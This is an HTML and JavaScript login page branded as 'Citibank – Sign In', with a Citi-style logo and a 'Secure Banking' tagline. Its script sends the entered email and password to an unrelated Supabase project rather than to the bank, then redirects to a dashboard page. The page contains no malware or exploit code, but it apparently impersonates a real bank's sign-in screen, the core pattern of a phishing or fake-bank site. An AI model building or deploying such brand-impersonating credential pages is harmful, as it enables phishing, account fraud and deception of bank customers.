<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>Citibank – Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
:root{--red:#E31837;--red-dark:#a0101f;--bg:#0a0a0a;--card:#161616;--border:rgba(255,255,255,0.08);--text:#fff;--muted:rgba(255,255,255,0.45);}
html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif;color:var(--text);-webkit-font-smoothing:antialiased;display:flex;align-items:center;justify-content:center;}
.wrap{width:100%;max-width:420px;padding:32px 24px 48px;animation:fadeUp .5s ease both;}
/* logo */
.logo-block{text-align:center;margin-bottom:36px;}
.logo-block svg{margin-bottom:6px;}
.logo-sub{font-size:12px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}
/* card */
.form-card{background:var(--card);border-radius:24px;padding:32px 28px;border:1px solid var(--border);box-shadow:0 24px 60px rgba(0,0,0,.5);}
.form-title{font-family:'Playfair Display',serif;font-size:24px;font-weight:700;margin-bottom:6px;}
.form-sub{font-size:14px;color:var(--muted);margin-bottom:28px;line-height:1.5;}
.field{margin-bottom:18px;}
.field label{display:block;margin-bottom:8px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.38);}
.field input{width:100%;background:rgba(255,255,255,0.05);border:1px solid var(--border);border-radius:13px;padding:14px 16px;color:white;font-size:16px;font-family:'DM Sans',sans-serif;outline:none;transition:border .18s;}
.field input:focus{border-color:rgba(227,24,55,0.6);}
.field input::placeholder{color:rgba(255,255,255,0.2);}
.field-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
.field-row label{margin-bottom:0;}
.forgot{font-size:12px;color:var(--red);font-weight:600;cursor:pointer;background:none;border:none;}
.btn{width:100%;padding:17px;background:linear-gradient(135deg,var(--red),var(--red-dark));border:none;border-radius:16px;color:white;font-size:16px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;margin-top:8px;box-shadow:0 8px 24px rgba(227,24,55,.3);transition:opacity .2s,transform .15s;}
.btn:hover{opacity:.9;transform:translateY(-1px);}
.btn:active{transform:translateY(0);}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}
.divider{display:flex;align-items:center;gap:12px;margin:20px 0;}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--border);}
.divider span{font-size:12px;color:var(--muted);}
.signup-link{text-align:center;font-size:14px;color:var(--muted);}
.signup-link a{color:var(--red);font-weight:700;text-decoration:none;}
@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-block">
    <svg viewBox="0 0 160 36" fill="none" xmlns="http://www.w3.org/2000/svg" width="160" height="36">
      <text y="28" font-family="'Playfair Display', serif" font-size="30" font-weight="700" fill="white">Citi</text>
      <rect x="82" y="8" width="4" height="20" rx="2" fill="#E31837"/>
      <text x="90" y="28" font-family="'DM Sans', sans-serif" font-size="20" font-weight="400" fill="rgba(255,255,255,0.7)">bank</text>
    </svg>
    <div class="logo-sub">Secure Banking</div>
  </div>

  <div class="form-card">
    <div class="form-title">Welcome back</div>
    <div class="form-sub">Sign in to your Citibank account</div>

    <div class="field">
      <label>Email Address</label>
      <input type="email" id="email" placeholder="you@example.com" autocomplete="email"/>
    </div>
    <div class="field">
      <div class="field-row">
        <label>Password</label>
        <button class="forgot" onclick="handleForgot()">Forgot password?</button>
      </div>
      <input type="password" id="password" placeholder="••••••••" autocomplete="current-password"
        onkeydown="if(event.key==='Enter')doLogin()"/>
    </div>

    <button class="btn" id="loginBtn" onclick="doLogin()">Sign In</button>

    <div class="divider"><span>or</span></div>
    <div class="signup-link">Don't have an account? <a href="signup.html">Create one</a></div>
  </div>
</div>

<script>
const SUPABASE_URL      = 'https://rgtbqipsdebekzznswll.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
const _sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// If already logged in, go to dashboard
(async()=>{
  const {data:{session}} = await _sb.auth.getSession();
  if(session) location.href='dashboard.html';
})();

function showToast(msg,ok=true){
  let t=document.getElementById('_toast');
  if(!t){t=document.createElement('div');t.id='_toast';
    t.style.cssText='position:fixed;top:22px;right:18px;z-index:9999;border-radius:14px;padding:13px 18px;font-size:14px;font-weight:600;max-width:300px;box-shadow:0 8px 28px rgba(0,0,0,.5);font-family:DM Sans,sans-serif;transition:opacity .3s;';
    document.body.appendChild(t);}
  t.textContent=(ok?'✓  ':'✗  ')+msg;
  t.style.background=ok?'linear-gradient(135deg,#0f2d1a,#091c10)':'linear-gradient(135deg,#2d0f0f,#1c0808)';
  t.style.border=ok?'1px solid rgba(34,197,94,.35)':'1px solid rgba(227,24,55,.35)';
  t.style.color=ok?'#4ade80':'#f87171';t.style.opacity='1';
  clearTimeout(t._timer);t._timer=setTimeout(()=>{t.style.opacity='0';},3200);
}

async function doLogin(){
  const email=document.getElementById('email').value.trim();
  const pass=document.getElementById('password').value;
  const btn=document.getElementById('loginBtn');
  if(!email||!pass){showToast('Please fill in all fields.',false);return;}
  btn.disabled=true;btn.textContent='Signing in…';
  const {data,error}=await _sb.auth.signInWithPassword({email,password:pass});
  if(error){showToast(error.message,false);btn.disabled=false;btn.textContent='Sign In';return;}
  // Store session and redirect
  showToast('Welcome back!');
  setTimeout(()=>location.href='dashboard.html',800);
}

async function handleForgot(){
  const email=document.getElementById('email').value.trim();
  if(!email){showToast('Enter your email first.',false);return;}
  const {error}=await _sb.auth.resetPasswordForEmail(email,{redirectTo:location.origin+'/index.html'});
  if(error){showToast(error.message,false);}else{showToast('Reset link sent to your email!');}
}
</script>
</body>
</html>
